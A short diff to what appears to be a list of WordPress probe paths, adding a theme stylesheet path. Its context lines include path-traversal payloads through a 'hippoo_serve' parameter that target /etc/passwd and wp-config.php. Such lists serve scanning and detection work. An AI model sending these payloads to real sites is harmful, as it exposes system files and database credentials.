@@ -156,3 +156,4 @@
 /wp-content/plugins/bookit/readme.txt
 /?hippoo_serve=../../../../../../../etc/passwd
 /?hippoo_serve=../../../../wp-config.php
+/wp-content/themes/xstore/style.css
